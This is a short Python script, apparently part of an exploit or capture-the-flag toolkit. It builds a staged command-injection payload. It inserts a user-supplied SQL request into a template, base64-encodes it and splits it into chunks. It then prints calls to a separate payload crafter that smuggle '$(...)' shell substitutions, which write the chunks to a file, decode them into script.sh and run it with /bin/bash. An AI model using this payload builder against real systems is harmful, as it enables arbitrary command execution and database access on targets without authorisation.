import sys

if len(sys.argv) < 2:
    print "Usage : "+sys.argv[0]+" [sql request]"
    exit()

sql_request = sys.argv[1]

model = open("model_request", "rb").read()
content = model.replace('XXXXXXXXXXXXXXXXXXXXXXXXXX', sql_request)

import base64

b64encoded = base64.b64encode(content)

split = [b64encoded[i:i+160] for i in range(0, len(b64encoded), 160)]

beg = "./craft_specific_payload.py ZZ_python \"y $(base64<<<'"
final_payload = beg+'echo '+split[0]+">b64ed')\" 0\n"
for i in range(1, len(split)):
    final_payload += beg+'echo '+split[i]+">>b64ed')\" 0\n"
final_payload += beg+"base64 -d < b64ed>script.sh')\" 0\n"
final_payload += beg+"/bin/bash script.sh')\" 0\n"

print(final_payload)
